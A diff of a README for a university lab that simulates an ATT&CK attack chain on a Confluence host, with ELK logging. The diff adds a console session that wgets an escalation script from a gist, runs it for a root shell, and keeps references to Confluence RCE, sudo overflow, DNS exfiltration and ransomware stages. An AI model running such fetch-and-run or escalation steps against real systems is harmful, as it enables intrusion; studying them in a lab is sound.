@@ -1,5 +1,5 @@
+![icon](https://user-images.githubusercontent.com/27985157/197839626-a557ecb6-ba39-4927-b588-65aa90b8c50b.png)
 # ICT3204 - Coursework Assignment 1
-
 - To plan and implement a attack simulation utilizing `ATT&CK tactics`, `techniques`
 - To integrate the usage of `Vagrant Scripts` and `Docker Containers`
 - To perform log `collection`, `cleaning` and `visualisation` with the use of the `ELK` stack
@@ -52,7 +52,7 @@ View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0b
       - [CVE-2022-26134 - Confluence RCE](#cve-2022-26134---confluence-rce)
     - [Privilege Escalation](#privilege-escalation)
       - [CVE-2021-3156 - Buffer Overflow Root Shell](#cve-2021-3156---buffer-overflow-root-shell)
-      - [K55 Linux Process Injection Utility](#k55-linux-process-injection-utility)
+      - [Abuse Elevation Control Mechanism](#abuse-elevation-control-mechanism)
     - [Persistence](#persistence)
       - [Persistence Using SUID Binaries](#persistence-using-suid-binaries)
       - [Persistence Using Account](#persistence-using-account)
@@ -66,6 +66,10 @@ View/edit the lucidchart diagram [here](https://lucid.app/lucidchart/6e6578d6-0b
       - [Exfiltrate Data Over DNS](#exfiltrate-data-over-dns)
     - [Impact](#impact)
       - [Ransomware Payload](#ransomware-payload)
+  - [Documentation](#documentation)
+    - [Kibana Dashboard](kibana-dashboard)
+    - [Poster](poster)
+    - [YouTube](YouTube)
 
 ## Part 1 - Spinning Up The Infrastructure
 1. Ensure Docker Engine is **running**
@@ -213,14 +217,17 @@ confluence@confluence:/vagrant/attack/2_PrivilegeEscalation$ ./demo_1_cve.sh
 root@confluence:/tmp/pe/CVE-2021-3156#
 ```
 
-#### K55 Linux Process Injection Utility
-[K55](https://github.com/josh0xA/K55) is a linux payload injection tool that is used for injecting x86_64 shellcode payloads into running processes.
+#### Abuse Elevation Control Mechanism
+The python package installer (PIP) can be used by the confluence user to gain sudo access by running an exploit script that abuses over-privilege.
 
-##### Continuing from Exploited Root Shell (Terminal 1)
+##### Running PIP Exploit
 ```console
-root@confluence:/tmp/pe/CVE-2021-3156# cd /vagrant/attack/2_PrivilegeEscalation
-root@confluence:/vagrant/attack/2_PrivilegeEscalation# sed -i -e 's/\r$//' demo_2_process_injection.sh
-root@confluence:/vagrant/attack/2_PrivilegeEscalation# ./demo_2_process_injection.sh
+root@confluence:/# su confluence
+confluence@confluence:/$ cd /tmp/pe
+confluence@confluence:/tmp/pe$ wget https://gist.githubusercontent.com/kevinnivekkevin/a9c929a632de3ff4c3b03fbbd247c6f2/raw/e740c5d73ff0a8b17ba3b54c2bfebfe102f3f197/sudoers_pe.sh
+confluence@confluence:/tmp/pe$ chmod +x sudoers_pe.sh
+confluence@confluence:/tmp/pe$ ./sudoers_pe.sh
+root@confluence:/#
 ```
 
 ##### Running a 2nd Exploited Root Shell (Terminal 2)
@@ -370,3 +377,8 @@ HOST-MACHINE@HOST $ vagrant provision --provision-with ransom
 ```
 
 <p align="right">(<a href="#ict3204---coursework-assignment-1">back to top</a>)</p>
+
+## Documentation
+### Kibana Dashboard
+### Poster
+### YouTube
